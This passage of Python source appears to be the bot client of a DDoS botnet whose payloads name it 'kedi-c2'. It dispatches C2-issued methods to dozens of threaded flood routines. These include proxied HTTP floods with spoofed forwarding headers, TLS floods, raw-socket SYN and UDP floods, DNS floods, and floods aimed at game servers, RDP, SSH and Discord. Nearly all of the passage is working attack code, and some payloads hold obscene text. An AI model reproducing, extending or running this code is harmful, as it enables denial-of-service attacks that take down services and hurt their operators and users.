                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
                                    s.connect((target , port))
                                for _ in range(rpc):
                                    ipt = spo_ip()
                                    payl = f'GET {path}?{strm(6)}={strm(6)}={strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()
                                    s.send(payl)
                            except:
                                pass
                            
                    def http_ir():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    sok5 = open('ir.txt' , 'r').read().split()
                                    s = socksocket()
                                    pri = che(sok5).split(':');
                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
                                    s = ctx.wrap_socket(s , server_hostname=target)
                                    s.connect((target , port))
                                else:
                                    sok5 = open('ir.txt' , 'r').read().split()
                                    s = socksocket()
                                    pri = che(sok5).split(':');
                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
                                    s.connect((target , port))
                                for _ in range(rpc):
                                    ipt = spo_ip()
                                    payl = f'GET {path}?{strm(6)}={strm(6)}={strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()
                                    s.send(payl)
                            except:
                                pass
                            
                    def tlsv1_2():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    context = SSLContext(PROTOCOL_TLSv1_2)
                                    with socket.create_connection((target , port)) as sock:
                                        with context.wrap_socket(sock , server_hostname=target ) as s:
                                            s.connect((target , port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((target , port))
                                for _ in range(rpc):
                                    iur = "https" if url.split('://')[0] == "https" else "http"
                                    payl = (
                                        f"GET {path} HTTP/1.1\r\n"
                                        f"Host: {target}\r\n"
                                        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\r\n"
                                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                                        f"Accept-Encoding: gzip, deflate, br\r\n"
                                        f"Accept-Language: en-US,en;q=0.9\r\n"
                                        f"Connection: close\r\n"
                                        f"\r\n"
                                    )
                                    s.sendall(payl.encode())
                            except:
                                pass
                                    
                    try:
                        ip_tt = str(c2.split()[2])
                    except:
                        pass

                    def udp():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl = byt(1024)
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def tcp():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = byt(1024)
                                    s.send(payl)
                            except:
                                pass

                    def gudp():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\00\x00'
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def gtcp():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = b"\x6B\x65\x64\x69\x63\x32\x20\x64\x61\x74\x61\x20\x6F\x6E\x74\x6F\x70\x20\x6D\x79\x20\x6F\x77\x6E\x20\x61\x73\x73\x20\x61\x6D\x70\x2F\x74\x72\x69\x70\x68\x65\x6E\x74\x20\x69\x73\x20\x6D\x79\x20\x64\x69\x63\x6B\x20\x61\x6E\x64\x20\x62\x61\x6C\x6C\x73"
                                    s.send(payl)
                            except:
                                pass

                    def dns():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl = dns_gen(ip_tt)
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def syn():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
                                s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
                                for _ in range(rpc):
                                    payl = syn_gen(ip_tt , port)
                                    s.sendto(payl)
                            except:
                                pass

                    def udp_bypass():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl = gen_payl()
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def tcp_bypass():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = gen_payl()
                                    s.send(payl)
                            except:
                                pass

                    def ts3():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl = gen_payl()
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass
                    def fiv():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl = b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73'
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def vse():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def pps():
                        while time() < timer:
                            try:
                                s1 = socket(AF_INET , SOCK_STREAM)
                                s2 = socket(AF_INET , SOCK_DGRAM)
                                s1.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = gen_payl()
                                    s1.send(payl)
                                    s2.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def udp_raw():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_RAW , IPPROTO_UDP)
                                s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
                                for _ in range(rpc):
                                    payl = udp_raw_head(ip_tt , port)
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def tcp_raw():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
                                s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
                                for _ in range(rpc):
                                    payl = gen_payl()
                                    s.sendto(payl)
                            except:
                                pass

                    def game():
                        while time() < timer:
                            try:
                                s1 = socket(AF_INET , SOCK_STREAM)
                                s2 = socket(AF_INET , SOCK_DGRAM)
                                s1.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl1 = game_udp(ip_tt , port)
                                    payl2 = game_tcp(ip_tt , port)
                                    s1.send(payl2)
                                    s2.sendto(payl1 , (ip_tt , port))
                            except:
                                pass

                    def r6():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl = r6_gen(ip_tt , port)
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def tcp_boom():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = tcpamp(source_port=port , dest_port=port , seq_num=1 , ack_num=0 , data_offset=5 , flags=0x12 , window_size=65535 , checksum=0 , urgent_pointer=0)
                                    s.send(payl)
                            except:
                                pass

                    def udp_boom():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    source_port = port
                                    dest_port = port
                                    length = 8 + len(b'<==kedi-c2/botnet-on-top-mother-fucker==>')
                                    checksum = 0
                                    data = b'<==kedi-c2/botnet-on-top-mother-fucker==>'
                                    udp_payload = udpxd(source_port , dest_port , length , checksum , data)
                                    payl = udp_payload.pack()
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def discord():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl = b"\x00\x01\x00\x46\x00\x03\x93\x6a\x00\x00\x00\x00\x00\x00\x00\x00" \
       b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
       b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
       b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
       b"\x00\x00\x00\x00\x00\x00\x00\x00\x3e\xe1"
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def tcp_paf():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
                                for _ in range(rpc):
                                    payl = tcp_paf_data(ip_tt , port)
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def tcp_conn():
                        while time() < timer:
                            try:
                                us = UserAgent()
                                ua = us.random
                                ctx = create_default_context(cafile=where())
                                ctx.check_hostname = False
                                ctx.verify_mode = CERT_NONE
                                parsed_url = urlparse(url)
                                ip_tt = parsed_url.netloc
                                path = parsed_url.path
                                if path == "":
                                    path = "/"
                                def generate_fake_phpsessid(length):
                                    characters = ascii_letters + digits
                                    fake_phpsessid = ''.join(che(characters) for _ in range(length))
                                    return fake_phpsessid
                                fake_cookie_phpsessid = generate_fake_phpsessid(147)
                                fake_cookie_phpsessidd = generate_fake_phpsessid(32)
                                response = get(url)
                                cookie = response.cookies
                                if cookie == '':
                                    cookie = ("cf_clearance="+fake_cookie_phpsessid, "PHPSSID="+fake_cookie_phpsessidd)
                                if port == 443:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s = ctx.wrap_socket(s , server_hostname=ip_tt)
                                    s.connect((ip_tt , port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = tcp_connhex(path , ip_tt , ua , cookie)
                                    s.sendto(payl , (ip_tt , port))
                            except:
                                pass

                    def tcp_hand():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = handshaketcp(port)
                                    s.send(payl)
                            except:
                                pass

                    def rdp():
                        while True:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt,port))
                                for _ in range(rpc):
                                    payl = b'\x00\x0b\x00\x00\x00'
                                    s.send(payl)
                            except:
                                pass
                        
                    def tcp_80():
                        while True:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt,port))
                                for _ in range(rpc):
                                    payl = b'\x0e\x00\x00\x00\x00\x00\x00\x00\x00'
                                    s.send(payl)
                            except:
                                pass

                    def ssh():
                        while True:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = b"\x53\x53\x48\x2d\x32\x2e\x30\x2d\x4f\x70\x65\x6e\x53\x53\x48"
                                    s.send(payl)
                            except:
                                pass

                    def tcp_storm():
                        while True:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                        b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                        b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                        b'\x73')
                                    s.send(payl)
                            except:
                                pass
                    
                    def mine():
                        while True:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl = mine_hex(target , port)
                                    s.send(payl.encode())
                            except:
                                pass
                            
                    def tcp_null():
                        while True:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((ip_tt , port))
                                for _ in range(rpc):
                                    payl =  b'\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01'
                                    s.send(payl)
                            except:
                                pass
                            
                    def udp_null():
                        while True:
                            try:
                                s = socket(AF_INET , SOCK_DGRAM)
                                for _ in range(rpc):
                                    payl =  b'\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01'
                                    s.sendto(payl , (target , port))
                            except:
                                pass

                try:
                    if method == 'raw':
                        for _ in range(threads):
                            thr(target=raw).start()
                    elif method == 'get':
                        for _ in range(threads):
                            thr(target=get).start()
                    elif method == 'rapid-reset':
                        for _ in range(threads):
                            thr(target=rapid).start()
                    elif method == 'spoof':
                        for _ in range(threads):
                            thr(target=spoof).start()
                    elif method == 'post':
                        for _ in range(threads):
                            thr(target=post).start()
                    elif method == 'bypass':
                        for _ in range(threads):
                            thr(target=bypass).start()
                    elif method == 'browser':
                        for _ in range(threads):
                            thr(target=browser).start()
                    elif method == 'put':
                        for _ in range(threads):
                            thr(target=put).start()
                    elif method == 'http-mix':
                        for _ in range(threads):
                            thr(target=http_mix).start()
                    elif method == 'http':
                        for _ in range(threads):
                            thr(target=http).start()
                    elif method == 'xmlrpc':
                        for _ in range(threads):
                            thr(target=xmlrpc).start()
                    elif method == 'https':
                        for _ in range(threads):
                            thr(target=https).start()
                    elif method == 'spoof-storm':
                        for _ in range(threads):
                            thr(target=spoof_storm).start()
                    elif method == 'http-ir':
                        for _ in range(threads):
                            thr(target=http_ir).start()
                    elif method == 'tls':
                        for _ in range(threads):
                            thr(target=tlsv1_2).start()
                    elif method == 'udp':
                        for _ in range(threads):
                            thr(target=udp).start()
                    elif method == 'tcp':
                        for _ in range(threads):
                            thr(target=tcp).start()
                    elif method == 'gudp':
                        for _ in range(threads):
                            thr(target=gudp).start()
                    elif method == 'gtcp':
                        for _ in range(threads):
                            thr(target=gtcp).start()
                    elif method == 'dns':
                        for _ in range(threads):
                            thr(target=dns).start()
                    elif method == 'syn':
                        for _ in range(threads):
                            thr(target=syn).start()
                    elif method == 'udp-bypass':
                        for _ in range(threads):
                            thr(target=udp_bypass).start()
                    elif method == 'tcp-bypass':
                        for _ in range(threads):
                            thr(target=tcp_bypass).start()
                    elif method == 'ts3':
                        for _ in range(threads):
                            thr(target=ts3).start()
                    elif method == 'fiv':
                        for _ in range(threads):
                            thr(target=fiv).start()
                    elif method == 'vse':
                        for _ in range(threads):
                            thr(target=vse).start()
                    elif method == 'pps':
                        for _ in range(threads):
                            thr(target=pps).start()
                    elif method == 'udp-raw':
                        for _ in range(threads):
                            thr(target=udp_raw).start()
                    elif method == 'tcp-raw':
                        for _ in range(threads):
                            thr(target=tcp_raw).start()
                    elif method == 'game':
                        for _ in range(threads):
                            thr(target=game).start()
                    elif method == 'r6':
                        for _ in range(threads):
                            thr(target=r6).start()
                    elif method == 'tcp-boom':
                        for _ in range(threads):
                            thr(target=tcp_boom).start()
                    elif method == 'udp-boom':
                        for _ in range(threads):
                            thr(target=udp_boom).start()
                    elif method == 'discord':
                        for _ in range(threads):
                            thr(target=discord).start()
                    elif method == 'tcp-paf':
                        for _ in range(threads):
                            thr(target=tcp_paf).start()
                    elif method == 'tcp-hand':
                        for _ in range(threads):
                            thr(target=tcp_hand).start()
                    elif method == 'tcp-conn':
                        for _ in range(threads):
                            thr(target=tcp_conn).start()
                    elif method == 'rdp':
                        for _ in range(threads):
                            thr(target=rdp).start()
                    elif method == 'tcp-80':
                        for _ in range(threads):
                            thr(target=tcp_80).start()
                    elif method == 'ssh':
                        for _ in range(threads):
                            thr(target=ssh).start()
                    elif method == 'tcp-storm':
                        for _ in range(threads):
                            thr(target=tcp_storm).start()
                    elif method == 'min':
                        for _ in range(threads):
                            thr(target=mine).start()
                    elif method == 'tcp-null':
                        for _ in range(threads):
                            thr(target=tcp_null).start()
                    elif method == 'udp-null':
                        for _ in range(threads):
                            thr(target=udp_null).start()
                except:
                    pass
        except:
            pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass
            sleep(5)
main()
